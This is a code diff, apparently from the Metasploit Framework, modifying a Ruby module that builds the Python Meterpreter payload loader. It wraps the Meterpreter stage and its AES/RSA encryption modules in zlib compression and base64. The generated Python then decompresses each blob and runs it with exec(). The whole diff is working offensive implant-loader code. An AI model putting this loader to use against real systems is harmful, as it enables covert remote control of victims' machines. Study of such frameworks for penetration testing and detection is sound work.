@@ -141,18 +141,18 @@ module Payload::Python::MeterpreterLoader
       met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
     end
 
-    met
+    Rex::Text.encode_base64(Rex::Text.zlib_deflate(met))
   end
 
   def python_encryptor_loader
-    aes_encryptor = Rex::Text.encode_base64(python_aes_source)
-    rsa_encryptor = Rex::Text.encode_base64(python_rsa_source)
+    aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
+    rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
     %Q?
-import codecs,imp,base64
+import codecs,imp,base64,zlib
 met_aes = imp.new_module('met_aes')
 met_rsa = imp.new_module('met_rsa')
-exec(compile(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0]),'<string>','exec'), met_aes.__dict__)
-exec(compile(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0]),'<string>','exec'), met_rsa.__dict__)
+exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'<string>','exec'), met_aes.__dict__)
+exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'<string>','exec'), met_rsa.__dict__)
 sys.modules['met_aes'] = met_aes
 sys.modules['met_rsa'] = met_rsa
 import met_rsa, met_aes
